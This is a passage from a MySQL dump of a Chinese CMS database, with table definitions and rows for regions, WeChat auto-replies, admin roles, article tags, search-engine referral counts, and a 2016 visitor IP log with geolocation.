,'南投县',3),(3396,397,'云林县',3),(3397,397,'屏东县',3),(3398,397,'台东县',3),(3399,397,'花莲县',3),(3400,397,'澎湖县',3),(3401,3,'合肥',2),(3402,3401,'庐阳区',3),(3403,3401,'瑶海区',3),(3404,3401,'蜀山区',3),(3405,3401,'包河区',3),(3406,3401,'长丰县',3),(3407,3401,'肥东县',3),(3408,3401,'肥西县',3);
/*!40000 ALTER TABLE `np_region` ENABLE KEYS */;

#
# Structure for table "np_reply"
#

DROP TABLE IF EXISTS `np_reply`;
CREATE TABLE `np_reply` (
  `id` smallint(6) unsigned NOT NULL AUTO_INCREMENT,
  `keyword` varchar(30) NOT NULL DEFAULT '' COMMENT '关键词',
  `title` varchar(80) NOT NULL DEFAULT '' COMMENT '标题',
  `content` varchar(500) NOT NULL DEFAULT '' COMMENT '内容',
  `type` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '类型 1自动回复 2关注回复 0关键词回复',
  `image` varchar(255) NOT NULL DEFAULT '' COMMENT '图片',
  `url` varchar(500) NOT NULL DEFAULT '' COMMENT '跳转链接',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '状态',
  `lang` varchar(50) NOT NULL DEFAULT 'zh-cn' COMMENT '语言',
  PRIMARY KEY (`id`),
  KEY `keyword` (`keyword`),
  KEY `type` (`type`),
  KEY `status` (`status`),
  KEY `lang` (`lang`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8 COMMENT='微信回复表';

#
# Data for table "np_reply"
#

/*!40000 ALTER TABLE `np_reply` DISABLE KEYS */;
INSERT INTO `np_reply` VALUES (1,'你好','网站首页','网站首页',0,'','',1,'zh-cn');
/*!40000 ALTER TABLE `np_reply` ENABLE KEYS */;

#
# Structure for table "np_role"
#

DROP TABLE IF EXISTS `np_role`;
CREATE TABLE `np_role` (
  `id` smallint(6) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL COMMENT '组名',
  `pid` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '父ID',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '状态',
  `remark` varchar(255) NOT NULL DEFAULT '' COMMENT '描述',
  PRIMARY KEY (`id`),
  KEY `pid` (`pid`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8 COMMENT='组表';

#
# Data for table "np_role"
#

/*!40000 ALTER TABLE `np_role` DISABLE KEYS */;
INSERT INTO `np_role` VALUES (1,'创始人',0,1,'创始人'),(2,'超级管理员',0,1,'超级管理员');
/*!40000 ALTER TABLE `np_role` ENABLE KEYS */;

#
# Structure for table "np_role_admin"
#

DROP TABLE IF EXISTS `np_role_admin`;
CREATE TABLE `np_role_admin` (
  `user_id` smallint(6) unsigned NOT NULL COMMENT '管理员ID',
  `role_id` smallint(6) unsigned DEFAULT NULL COMMENT '组ID',
  PRIMARY KEY (`user_id`),
  KEY `group_id` (`role_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='管理员组关系表';

#
# Data for table "np_role_admin"
#

/*!40000 ALTER TABLE `np_role_admin` DISABLE KEYS */;
INSERT INTO `np_role_admin` VALUES (1,1),(4,2);
/*!40000 ALTER TABLE `np_role_admin` ENABLE KEYS */;

#
# Structure for table "np_searchengine"
#

DROP TABLE IF EXISTS `np_searchengine`;
CREATE TABLE `np_searchengine` (
  `date` int(11) NOT NULL COMMENT '日期',
  `name` varchar(20) NOT NULL COMMENT '搜索引擎名',
  `count` int(11) unsigned NOT NULL DEFAULT '1' COMMENT '统计数量',
  KEY `date` (`date`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='搜索引擎';

#
# Data for table "np_searchengine"
#

/*!40000 ALTER TABLE `np_searchengine` DISABLE KEYS */;
INSERT INTO `np_searchengine` VALUES (1474214400,'GOOGLE',13),(1474214400,'YAHOO',1),(1474300800,'BAIDU',1),(1474300800,'GOOGLE',8),(1474387200,'GOOGLE',6),(1474387200,'BAIDU',1),(1474473600,'BAIDU',1),(1474473600,'GOOGLE',4),(1474560000,'BAIDU',1),(1474560000,'GOOGLE',1),(1474560000,'YAHOO',1),(1474646400,'GOOGLE',3),(1474732800,'GOOGLE',1),(1474732800,'YAHOO',9),(1474819200,'GOOGLE',2),(1474819200,'YAHOO',1),(1474905600,'GOOGLE',20),(1474905600,'YAHOO',1),(1474992000,'GOOGLE',3),(1475078400,'BAIDU',1),(1475078400,'GOOGLE',3),(1475164800,'GOOGLE',2),(1475164800,'BAIDU',1),(1475164800,'YAHOO',1),(1481507096,'GOOGLE',1),(1481507110,'GOOGLE',1),(1481507121,'GOOGLE',1),(1481472000,'GOOGLE',34),(1481558400,'GOOGLE',47),(1481644800,'GOOGLE',54);
/*!40000 ALTER TABLE `np_searchengine` ENABLE KEYS */;

#
# Structure for table "np_tags"
#

DROP TABLE IF EXISTS `np_tags`;
CREATE TABLE `np_tags` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL COMMENT '标签名',
  `count` int(11) unsigned NOT NULL DEFAULT '1' COMMENT '标签文章数量',
  `lang` varchar(20) NOT NULL DEFAULT 'zh-cn' COMMENT '语言',
  PRIMARY KEY (`id`),
  KEY `name` (`name`),
  KEY `count` (`count`),
  KEY `lang` (`lang`)
) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COMMENT='标签表';

#
# Data for table "np_tags"
#

/*!40000 ALTER TABLE `np_tags` DISABLE KEYS */;
INSERT INTO `np_tags` VALUES (1,'防范',1,'zh-cn'),(2,'攻击',1,'zh-cn'),(3,'安全',1,'zh-cn'),(4,'XSS',1,'zh-cn'),(5,'公众',1,'zh-cn'),(6,'平台',1,'zh-cn'),(7,'微信公众平台',1,'zh-cn'),(8,'微信公众号',1,'zh-cn'),(9,'discuz',1,'zh-cn'),(10,'javascript',2,'zh-cn'),(11,'xss攻击',1,'zh-cn');
/*!40000 ALTER TABLE `np_tags` ENABLE KEYS */;

#
# Structure for table "np_tags_article"
#

DROP TABLE IF EXISTS `np_tags_article`;
CREATE TABLE `np_tags_article` (
  `tags_id` int(11) unsigned NOT NULL COMMENT '标签ID',
  `category_id` int(11) unsigned NOT NULL COMMENT '栏目ID',
  `article_id` int(11) unsigned NOT NULL COMMENT '文章ID',
  KEY `tags_id` (`tags_id`),
  KEY `category_id` (`category_id`),
  KEY `article_id` (`article_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='标签文章关联表';

#
# Data for table "np_tags_article"
#

/*!40000 ALTER TABLE `np_tags_article` DISABLE KEYS */;
INSERT INTO `np_tags_article` VALUES (10,2,8),(10,2,6),(9,3,5),(7,3,2),(8,3,2);
/*!40000 ALTER TABLE `np_tags_article` ENABLE KEYS */;

#
# Structure for table "np_type"
#

DROP TABLE IF EXISTS `np_type`;
CREATE TABLE `np_type` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `category_id` smallint(6) unsigned NOT NULL COMMENT '栏目ID',
  `name` varchar(255) NOT NULL DEFAULT '' COMMENT '字段名',
  `description` varchar(555) NOT NULL DEFAULT '' COMMENT '描述',
  PRIMARY KEY (`id`),
  KEY `category_id` (`category_id`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8 COMMENT='分类';

#
# Data for table "np_type"
#

/*!40000 ALTER TABLE `np_type` DISABLE KEYS */;
INSERT INTO `np_type` VALUES (1,1,'源代码',''),(2,1,'前端开发',''),(3,1,'平面设计',''),(5,3,'分类11',''),(6,3,'分类12',''),(7,15,'分类21','');
/*!40000 ALTER TABLE `np_type` ENABLE KEYS */;

#
# Structure for table "np_visit"
#

DROP TABLE IF EXISTS `np_visit`;
CREATE TABLE `np_visit` (
  `date` int(11) NOT NULL COMMENT '日期',
  `ip` varchar(15) NOT NULL DEFAULT '' COMMENT '访问IP',
  `ip_attr` varchar(255) NOT NULL DEFAULT '' COMMENT '访问IP地区',
  `count` int(11) unsigned NOT NULL DEFAULT '1' COMMENT '统计数量',
  KEY `date` (`date`),
  KEY `ip` (`ip`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='访问表';

#
# Data for table "np_visit"
#

/*!40000 ALTER TABLE `np_visit` DISABLE KEYS */;
INSERT INTO `np_visit` VALUES (1474300800,'113.143.183.184','陕西省渭南市电信',40),(1474300800,'101.226.162.90','上海市电信',83),(1474300800,'125.88.223.58','广东省电信(绿色上网全省通用)',83),(1474300800,'121.43.105.176','河北省廊坊市铁通',55),(1474300800,'117.34.28.15','陕西省西安市电信',48),(1474300800,'183.61.236.16','广东省广州市电信',34),(1474300800,'117.27.149.13','福建省福州市电信',29),(1474300800,'120.27.40.113','北京市北京新比林通信技术有限公司',55),(1474300800,'182.92.1.233','浙江省杭州市阿里巴巴网络有限公司',55),(1474300800,'111.206.241.75','北京市联通',1),(1474300800,'183.61.236.15','广东省广州市电信',20),(1474300800,'117.27.149.15','福建省福州市电信',26),(1474300800,'117.34.28.13','陕西省西安市电信',34),(1474300800,'183.61.236.14','广东省广州市电信',28),(1474300800,'117.27.149.14','福建省福州市电信',28),(1474300800,'180.153.196.192','上海市电信',1),(1474300800,'42.120.161.94','浙江省杭州市阿里云服务器',1),(1474300800,'220.181.51.109','北京市北京百度网讯科技有限公司电信节点',1),(1474300800,'42.236.10.100','河南省郑州市联通',1),(1474300800,'42.236.10.71','河南省郑州市联通',2),(1474300800,'42.236.10.100','河南省郑州市联通',1),(1474300800,'42.236.10.98','河南省郑州市联通',1),(1474300800,'180.163.2.118','上海市电信',1),(1474300800,'101.226.33.220','上海市电信',1),(1474300800,'101.226.33.206','上海市电信',1),(1474300800,'101.226.89.120','上海市电信',1),(1474300800,'101.226.89.121','上海市电信',1),(1474300800,'180.163.1.46','上海市电信',1),(1474300800,'36.40.137.118','陕西省西安市阎良区电信',2),(1474300800,'61.135.169.40','北京市北京百度网讯科技有限公司联通节点',1),(1474300800,'113.200.204.152','陕西省西安市联通',1),(1474300800,'220.181.108.145','北京市北京百度网讯科技有限公司电信节点',1),(1474300800,'42.156.254.3','浙江省杭州市阿里巴巴网络有限公司',1),(1474300800,'157.55.39.158','美国Microsoft公司',1),(1474300800,'101.226.167.235','上海市电信',1),(1474300800,'101.226.169.211','上海市电信',1),(1474300800,'101.226.167.207','上海市电信',1),(1474300800,'101.226.168.224','上海市上海有孚计算机网络有限公司电信节点',1),(1474300800,'182.118.22.228','河南省郑州市联通',1),(1474300800,'182.118.21.205','河南省郑州市联通',1),(1474300800,'182.118.20.235','河南省郑州市联通',1),(1474300800,'54.183.153.209','美国新泽西州(Merck公司)',1),(1474387200,'117.34.28.15','陕西省西安市电信',72),(1474387200,'183.61.236.16','广东省广州市电信',58),(1474387200,'117.27.149.13','福建省福州市电信',51),(1474387200,'125.88.223.58','广东省电信(绿色上网全省通用)',145),(1474387200,'121.43.105.176','河北省廊坊市铁通',96),(1474387200,'101.226.162.90','上海市电信',141),(1474387200,'182.92.1.233','浙江省杭州市阿里巴巴网络有限公司',96),(1474387200,'120.27.40.113','北京市北京新比林通信技术有限公司',96),(1474387200,'117.34.28.13','陕西省西安市电信',72),(1474387200,'117.27.149.15','福建省福州市电信',56),(1474387200,'117.27.149.14','福建省福州市电信',38),(1474387200,'183.61.236.14','广东省广州市电信',37),(1474387200,'183.61.236.15','广东省广州市电信',49),(1474387200,'123.125.71.56','北京市百度蜘蛛',1),(1474387200,'42.156.138.69','浙江省杭州市阿里巴巴网络有限公司',1),(1474387200,'180.153.196.155','上海市电信',1),(1474387200,'218.30.118.102','北京市电信互联网数据中心',4),(1474387200,'42.156.254.4','浙江省杭州市阿里巴巴网络有限公司',4),(1474387200,'123.125.71.54','北京市百度蜘蛛',1),(1474387200,'42.156.136.125','浙江省杭州市阿里巴巴网络有限公司',1),(1474387200,'112.117.216.171','云南省昆明市上海网宿科技股份有限公司电信CDN节点',1),(1474387200,'220.181.108.81','北京市北京百度网讯科技有限公司电信节点',1),(1474387200,'62.210.80.20','法国',1),(1474387200,'106.120.173.147','北京市北京电信互联网数据中心节点',2),(1474387200,'113.200.107.67','陕西省西安市联通',1),(1474387200,'140.207.198.153','上海市联通',1),(1474387200,'123.125.71.39','北京市百度蜘蛛',1),(1474387200,'36.40.137.118','陕西省西安市阎良区电信',30),(1474387200,'101.226.66.193','上海市电信',1),(1474387200,'180.153.214.188','上海市电信',1),(1474387200,'101.226.51.230','上海市电信',1),(1474387200,'157.55.39.158','美国Microsoft公司',1),(1474387200,'220.181.108.149','北京市北京百度网讯科技有限公司电信节点',1),(1474387200,'101.226.65.108','上海市电信',2),(1474387200,'101.226.69.246','上海市电信',1),(1474387200,'101.226.89.117','上海市电信',1),(1474387200,'101.226.99.197','上海市电信',1),(1474387200,'101.226.33.202','上海市电信',1),(1474387200,'220.181.108.99','北京市北京百度网讯科技有限公司电信节点',1),(1474387200,'130.193.51.44','俄罗斯',1),(1474387200,'42.156.139.59','浙江省杭州市阿里巴巴网络有限公司',1),(1474387200,'220.181.51.104','北京市北京百度网讯科技有限公司电信节点',1),(1474387200,'113.143.180.13','陕西省渭南市电信',15),(1474387200,'123.125.71.74','北京市百度蜘蛛',1),(1474387200,'220.181.108.84','北京市北京百度网讯科技有限公司电信节点',1),(1474387200,'220.181.108.122','北京市北京百度网讯科技有限公司电信节点',1),(1474387200,'101.226.64.174','上海市电信',1),(1474387200,'180.153.201.79','上海市电信',1),(1474387200,'220.181.108.187','北京市北京百度网讯科技有限公司电信节点',1),(1474387200,'42.156.136.27','浙江省杭州市阿里巴巴网络有限公司',1),(1474387200,'123.125.71.109','北京市百度蜘蛛',1),(1474387200,'180.153.214.197','上海市电信',2),(1474387200,'101.226.68.200','上海市电信',1),(1474387200,'101.226.33.228','上海市电信',1),(1474387200,'42.156.254.3','浙江省杭州市阿里巴巴网络有限公司',1),(1474387200,'101.226.65.106','上海市电信',1),(1474387200,'180.153.214.198','上海市电信',1),(1474387200,'180.153.196.157','上海市电信',1),(1474387200,'220.181.108.112','北京市北京百度网讯科技有限公司电信节点',1),(1474387200,'113.200.204.167','陕西省西安市联通',1),(1474387200,'61.135.165.8','北京市北京百度网讯科技有限公司联通节点',1),(1474387200,'124.22.31.190','陕西省西安市广电网',4),(1474387200,'124.23.19.63','陕西省安康市广电网',1),(1474473600,'183.61.236.15','广东省广州市电信',30),(1474473600,'117.34.28.15','陕西省西安市电信',70),(1474473600,'117.27.149.15','福建省福州市电信',54),(1474473600,'101.226.162.90','上海市电信',145),(1474473600,'125.88.223.58','广东省电信(绿色上网全省通用)',145),(1474473600,'121.43.105.176','河北省廊坊市铁通',96),(1474473600,'182.92.1.233','浙江省杭州市阿里巴巴网络有限公司',96),(1474473600,'120.27.40.113','北京市北京新比林通信技术有限公司',91),(1474473600,'183.61.236.16','广东省广州市电信',76),(1474473600,'42.156.139.70','浙江省杭州市阿里巴巴网络有限公司',6),(1474473600,'183.61.236.14','广东省广州市电信',38),(1474473600,'117.34.28.13','陕西省西安市电信',74),(1474473600,'117.27.149.14','福建省福州市电信',45),(1474473600,'117.27.149.13','福建省福州市电信',46),(1474473600,'220.181.158.106','北京市北京电信互联网数据中心',4),(1474473600,'42.156.137.70','浙江省杭州市阿里巴巴网络有限公司',2),(1474473600,'60.191.136.35','浙江省台州市电信',1),(1474473600,'106.120.173.147','北京市北京电信互联网数据中心节点',1),(1474473600,'180.153.195.229','上海市电信',1),(1474473600,'42.156.138.103','浙江省杭州市阿里巴巴网络有限公司',1),(1474473600,'42.236.10.100','河南省郑州市联通',2),(1474473600,'42.236.10.71','河南省郑州市联通',2),(1474473600,'180.153.185.24','上海市电信',1),(1474473600,'113.143.180.13','陕西省渭南市电信',19),(1474473600,'101.226.65.106','上海市电信',1),(1474473600,'101.226.69.246','上海市电信',1),(1474473600,'180.163.2.119','上海市电信',1),(1474473600,'101.226.65.108','上海市电信',2),(1474473600,'180.153.206.18','上海市电信',1),(1474473600,'61.151.226.199','上海市电信',1),(1474473600,'157.55.39.158','美国Microsoft公司',2),(1474473600,'123.125.67.145','北京市北京百度网讯科技有限公司',1),(1474473600,'220.181.108.186','北京市北京百度网讯科技有限公司电信节点',1),(1474473600,'123.125.71.18','北京市百度蜘蛛',1),(1474473600,'101.226.169.210','上海市电信',1),(1474473600,'182.118.21.218','河南省郑州市联通',1),(1474473600,'182.118.20.235','河南省郑州市联通',1),(1474473600,'182.118.21.210','河南省郑州市联通',1),(1474473600,'182.118.20.225','河南省郑州市联通',2),(1474473600,'182.118.25.211','河南省郑州市联通',1),(1474473600,'182.118.25.206','河南省郑州市联通',1),(1474473600,'182.118.25.217','河南省郑州市联通',1),(1474473600,'182.118.21.230','河南省郑州市联通',1),(1474473600,'123.125.71.51','北京市百度蜘蛛',1),(1474473600,'182.118.20.201','河南省郑州市联通',2),(1474473600,'182.118.21.227','河南省郑州市联通',2),(1474473600,'182.118.21.206','河南省郑州市联通',1),(1474473600,'182.118.22.211','河南省郑州市联通',1),(1474473600,'182.118.20.215','河南省郑州市联通',1),(1474473600,'182.118.20.217','河南省郑州市联通',1),(1474473600,'182.118.20.174','河南省郑州市联通',1),(1474473600,'182.118.20.170','河南省郑州市联通',1),(1474473600,'182.118.21.220','河南省郑州市联通',1),(1474473600,'36.40.139.14','陕西省西安市电信',8),(1474473600,'182.118.22.218','河南省郑州市联通',1),(1474473600,'101.226.66.181','上海市电信',1),(1474473600,'182.118.20.220','河南省郑州市联通',1),(1474473600,'182.118.25.230','河南省郑州市联通',1),(1474473600,'182.118.25.220','河南省郑州市联通',1),(1474473600,'182.118.25.228','河南省郑州市联通',1),(1474473600,'101.226.168.245','上海市上海有孚计算机网络有限公司电信节点',1),(1474473600,'101.226.169.208','上海市电信',1),(1474473600,'101.226.169.225','上海市电信',1),(1474473600,'211.99.132.172','北京市歌华有线',1),(1474473600,'123.125.71.49','北京市百度蜘蛛',1),(1474473600,'101.226.167.198','上海市电信',1),(1474473600,'101.226.89.123','上海市电信',1),(1474473600,'101.226.68.200','上海市电信',1),(1474473600,'180.153.206.24','上海市电信',1),(1474473600,'101.226.66.172','上海市电信',1),(1474473600,'123.125.71.106','北京市百度蜘蛛',1),(1474473600,'130.193.51.44','俄罗斯',1),(1474473600,'124.23.19.63','陕西省安康市广电网',15),(1474473600,'182.118.25.225','河南省郑州市联通',1),(1474473600,'61.151.226.202','上海市电信',1),(1474473600,'180.153.214.190','上海市电信',1),(1474473600,'180.163.2.118','上海市电信',1),(1474473600,'182.118.20.173','河南省郑州市联通',1),(1474473600,'115.29.113.101','北京市万网IDC机房',4),(1474560000,'125.88.223.58','广东省电信(绿色上网全省通用)',145),(1474560000,'183.61.236.16','广东省广州市电信',27),(1474560000,'117.34.28.15','陕西省西安市电信',71),(1474560000,'117.27.149.15','福建省福州市电信',44),(1474560000,'101.226.162.90','上海市电信',145),(1474560000,'121.43.105.176','河北省廊坊市铁通',96),(1474560000,'115.29.113.101','北京市万网IDC机房',96),(1474560000,'182.92.1.233','浙江省杭州市阿里巴巴网络有限公司',96),(1474560000,'183.61.236.14','广东省广州市电信',19),(1474560000,'183.61.236.15','广东省广州市电信',20),(1474560000,'117.27.149.14','福建省福州市电信',62),(1474560000,'117.27.149.13','福建省福州市电信',39),(1474560000,'117.34.28.13','陕西省西安市电信',73),(1474560000,'61.135.165.9','北京市北京百度网讯科技有限公司联通节点',1),(1474560000,'106.120.173.147','北京市北京电信互联网数据中心节点',4),(1474560000,'123.125.71.103','北京市百度蜘蛛',1),(1474560000,'42.156.136.32','浙江省杭州市阿里巴巴网络有限公司',3),(1474560000,'220.181.108.182','北京市北京百度网讯科技有限公司电信节点',1),(1474560000,'123.125.71.12','北京市百度蜘蛛',1),(1474560000,'182.118.21.221','河南省郑州市联通',1),(1474560000,'218.30.118.100','北京市电信互联网数据中心',3),(1474560000,'36.40.139.14','陕西省西安市电信',4),(1474560000,'101.226.68.213','上海市电信',1),(1474560000,'101.226.33.200','上海市电信',1),(1474560000,'218.30.118.102','北京市电信互联网数据中心',1),(1474560000,'157.55.39.158','美国Microsoft公司',1),(1474560000,'182.118.22.220','河南省郑州市联通',1),(1474560000,'180.153.196.170','上海市电信',1),(1474560000,'121.42.0.85','河北省石家庄市铁通',1),(1474560000,'42.156.137.115','浙江省杭州市阿里巴巴网络有限公司',1),(1474560000,'36.40.138.123','陕西省西安市阎良区电信',10),(1474560000,'101.226.33.226','上海市电信',1),(1474560000,'42.156.139.102','浙江省杭州市阿里巴巴网络有限公司',1),(1474560000,'124.22.111.103','陕西省宝鸡市广电网',6),(1474560000,'61.151.228.22','上海市电信',1),(1474560000,'101.226.33.217','上海市电信',1),(1474560000,'42.120.161.47','浙江省杭州市阿里云服务器',1),(1474560000,'42.120.160.120','浙江省杭州市阿里云服务器',1),(1474646400,'125.88.223.58','广东省电信(绿色上网全省通用)',146),(1474646400,'117.34.28.13','陕西省西安市电信',65),(1474646400,'117.27.149.15','福建省福州市电信',46),(1474646400,'101.226.162.90','上海市电信',143),(1474646400,'121.43.105.176','河北省廊坊市铁通',96),(1474646400,'115.29.113.101','北京市万网IDC机房',96),(1474646400,'182.92.1.233','浙江省杭州市阿里巴巴网络有限公司',96),(1474646400,'117.34.28.15','陕西省西安市电信',79),(1474646400,'117.27.149.14','福建省福州市电信',50),(1474646400,'42.156.137.32','浙江省杭州市阿里巴巴网络有限公司',1),(1474646400,'117.27.149.13','福建省福州市电信',49),(1474646400,'157.55.39.251','美国Microsoft公司',1),(1474646400,'218.30.118.102','北京市电信互联网数据中心',1),(1474646400,'42.156.136.34','浙江省杭州市阿里巴巴网络有限公司',1),(1474646400,'112.117.216.171','云南省昆明市上海网宿科技股份有限公司电信CDN节点',1),(1474646400,'106.120.173.147','北京市北京电信互联网数据中心节点',2),(1474646400,'42.236.10.71','河南省郑州市联通',1),(1474646400,'42.156.139.33','浙江省杭州市阿里巴巴网络有限公司',1),(1474646400,'36.40.138.180','陕西省西安市阎良区电信',3),(1474646400,'101.226.33.219','上海市电信',1),(1474646400,'101.226.66.187','上海市电信',1),(1474646400,'101.226.89.117','上海市电信',1),(1474646400,'61.135.169.43','北京市北京百度网讯科技有限公司联通节点',1),(1474646400,'220.181.108.110','北京市北京百度网讯科技有限公司电信节点',1),(1474646400,'42.156.139.32','浙江省杭州市阿里巴巴网络有限公司',2),(1474646400,'157.55.39.192','美国Microsoft公司',1),(1474646400,'113.143.182.219','陕西省渭南市电信',8),(1474646400,'101.226.125.105','上海市电信',1),(1474646400,'101.226.33.238','上海市电信',1),(1474646400,'101.226.33.201','上海市电信',1),(1474646400,'180.153.195.142','上海市电信',1),(1474646400,'220.181.108.108','北京市北京百度网讯科技有限公司电信节点',1),(1474646400,'220.181.51.109','北京市北京百度网讯科技有限公司电信节点',1),(1474646400,'124.22.111.103','陕西省宝鸡市广电网',6),(1474646400,'180.153.206.21','上海市电信',1),(1474646400,'101.226.125.16','上海市电信',1),(1474646400,'101.226.33.204','上海市电信',1),(1474732800,'117.34.28.13','陕西省西安市电信',70),(1474732800,'117.27.149.15','福建省福州市电信',43),(1474732800,'101.226.162.90','上海市电信',142),(1474732800,'121.43.105.176','河北省廊坊市铁通',96),(1474732800,'125.88.223.58','广东省电信(绿色上网全省通用)',143),(1474732800,'115.29.113.101','北京市万网IDC机房',96),(1474732800,'182.92.1.233','浙江省杭州市阿里巴巴网络有限公司',96),(1474732800,'117.34.28.15','陕西省西安市电信',74),(1474732800,'42.120.161.66','浙江省杭州市阿里云服务器',1),(1474732800,'117.27.149.14','福建省福州市电信',61),(1474732800,'42.156.138.32','浙江省杭州市阿里巴巴网络有限公司',1),(1474732800,'117.27.149.13','福建省福州市电信',41),(1474732800,'123.125.71.116','北京市百度蜘蛛',1),(1474732800,'157.55.39.192','美国Microsoft公司',2),(1474732800,'218.30.118.102','北京市电信互联网数据中心',1),(1474732800,'42.156.136.32','浙江省杭州市阿里巴巴网络有限公司',2),(1474732800,'106.120.173.147','北京市北京电信互联网数据中心节点',8),(1474732800,'123.125.67.218','北京市北京百度网讯科技有限公司',1),(1474732800,'220.181.108.113','北京市北京百度网讯科技有限公司电信节点',1),(1474732800,'220.181.108.159','北京市北京百度网讯科技有限公司电信节点',1),(1474732800,'220.181.108.96','北京市北京百度网讯科技有限公司电信节点',1),(1474732800,'61.135.169.10','北京市北京百度网讯科技有限公司联通节点',1),(1474732800,'180.153.195.41','上海市电信',1),(1474732800,'124.22.110.42','陕西省宝鸡市广电网',3),(1474732800,'42.236.10.72','河南省郑州市联通',2),(1474819200,'101.226.162.90','上海市电信',143),(1474819200,'117.27.149.15','福建省福州市电信',56),(1474819200,'117.34.28.15','陕西省西安市电信',77),(1474819200,'121.43.105.176','河北省廊坊市铁通',96),(1474819200,'125.88.223.58','广东省电信(绿色上网全省通用)',145),(1474819200,'115.29.113.101','北京市万网IDC机房',96),(1474819200,'182.92.1.233','浙江省杭州市阿里巴巴网络有限公司',96),(1474819200,'117.34.28.13','陕西省西安市电信',67),(1474819200,'117.27.149.14','福建省福州市电信',45),(1474819200,'117.27.149.13','福建省福州市电信',44),(1474819200,'157.55.39.192','美国Microsoft公司',1),(1474819200,'218.30.118.102','北京市电信互联网数据中心',1),(1474819200,'42.156.139.32','浙江省杭州市阿里巴巴网络有限公司',2),(1474819200,'42.156.136.32','浙江省杭州市阿里巴巴网络有限公司',2),(1474819200,'220.181.51.109','北京市北京百度网讯科技有限公司电信节点',1),(1474819200,'123.125.71.113','北京市百度蜘蛛',1),(1474819200,'113.200.204.152','陕西省西安市联通',2),(1474819200,'123.125.67.215','北京市北京百度网讯科技有限公司',1),(1474819200,'36.40.139.64','陕西省西安市电信',9),(1474819200,'106.120.173.147','北京市北京电信互联网数据中心节点',15),(1474819200,'183.233.224.218','广东省广州市移动',1),(1474819200,'112.65.193.15','上海市联通漕河泾IDC机房',1),(1474819200,'101.226.33.203','上海市电信',1),(1474819200,'101.226.33.223','上海市电信',1),(1474819200,'220.181.51.82','北京市北京百度网讯科技有限公司电信节点',1),(1474819200,'113.200.204.94','陕西省西安市联通',1),(1474819200,'124.22.110.42','陕西省宝鸡市广电网',5),(1474819200,'101.226.102.97','上海市电信',1),(1474819200,'180.163.2.88','上海市电信',1),(1474819200,'180.153.214.180','上海市电信',1),(1474819200,'101.226.66.173','上海市电信',1),(1474819200,'180.153.201.15','上海市电信',1),(1474819200,'101.226.69.246','上海市电信',1),(1474819200,'180.163.2.117','上海市电信',1),(1474819200,'182.118.20.162','河南省郑州市联通',1),(1474819200,'182.118.25.224','河南省郑州市联通',1),(1474819200,'182.118.22.227','河南省郑州市联通',1),(1474819200,'182.118.25.228','河南省郑州市联通',1),(1474819200,'182.118.20.217','河南省郑州市联通',1),(1474819200,'182.118.20.169','河南省郑州市联通',1),(1474819200,'182.118.22.228','河南省郑州市联通',1),(1474819200,'182.118.20.166','河南省郑州市联通',1),(1474819200,'182.118.20.165','河南省郑州市联通',2),(1474819200,'182.118.20.233','河南省郑州市联通',1),(1474819200,'182.118.22.218','河南省郑州市联通',1),(1474819200,'182.118.22.214','河南省郑州市联通',1),(1474819200,'182.118.25.218','河南省郑州市联通',1),(1474819200,'182.118.25.204','河南省郑州市联通',2),(1474819200,'182.118.25.227','河南省郑州市联通',1),(1474819200,'157.55.39.38','美国Microsoft公司',1),(1474819200,'182.118.25.207','河南省郑州市联通',1),(1474819200,'101.226.167.235','上海市电信',1),(1474819200,'101.226.168.196','上海市上海有孚计算机网络有限公司电信节点',1),(1474819200,'101.226.166.199','上海市电信',1),(1474819200,'182.118.21.211','河南省郑州市联通',1),(1474819200,'101.226.166.209','上海市电信',1),(1474819200,'182.118.21.221','河南省郑州市联通',1),(1474819200,'182.118.21.203','河南省郑州市联通',1),(1474819200,'101.226.166.228','上海市电信',1),(1474819200,'101.226.168.244','上海市上海有孚计算机网络有限公司电信节点',1),(1474819200,'182.118.20.229','河南省郑州市联通',1),(1474819200,'182.118.20.226','河南省郑州市联通',1),(1474819200,'182.118.20.173','河南省郑州市联通',1),(1474819200,'101.226.166.252','上海市电信',1),(1474819200,'101.226.166.197','上海市电信',1),(1474819200,'182.118.22.217','河南省郑州市联通',1),(1474819200,'182.118.20.215','河南省郑州市联通',1),(1474819200,'101.226.169.197','上海市电信',1),(1474819200,'101.226.169.223','上海市电信',1),(1474819200,'182.118.20.218','河南省郑州市联通',1),(1474819200,'101.226.167.198','上海市电信',1),(1474819200,'182.118.21.210','河南省郑州市联通',1),(1474819200,'182.118.21.249','河南省郑州市联通',1),(1474819200,'101.226.168.207','上海市上海有孚计算机网络有限公司电信节点',1),(1474819200,'42.236.10.100','河南省郑州市联通',2),(1474819200,'42.156.139.94','浙江省杭州市阿里巴巴网络有限公司',1),(1474819200,'42.156.137.94','浙江省杭州市阿里巴巴网络有限公司',1),(1474819200,'42.120.161.94','浙江省杭州市阿里云服务器',1),(1474905600,'101.226.162.90','上海市电信',115),(1474905600,'106.120.173.147','北京市北京电信互联网数据中心节点',8),(1474905600,'117.34.28.15','陕西省西安市电信',61),(1474905600,'117.27.149.13','福建省福州市电信',47),(1474905600,'125.88.223.58','广东省电信(绿色上网全省通用)',140),(1474905600,'121.43.105.176','河北省廊坊市铁通',96),(1474905600,'115.29.113.101','北京市万网IDC机房',96),(1474905600,'182.92.1.233','浙江省杭州市阿里巴巴网络有限公司',80),(1474905600,'117.34.28.13','陕西省西安市电信',83),(1474905600,'117.27.149.14','福建省福州市电信',56),(1474905600,'42.156.139.32','浙江省杭州市阿里巴巴网络有限公司',1),(1474905600,'180.153.195.204','上海市电信',1),(1474905600,'117.27.149.15','福建省福州市电信',42),(1474905600,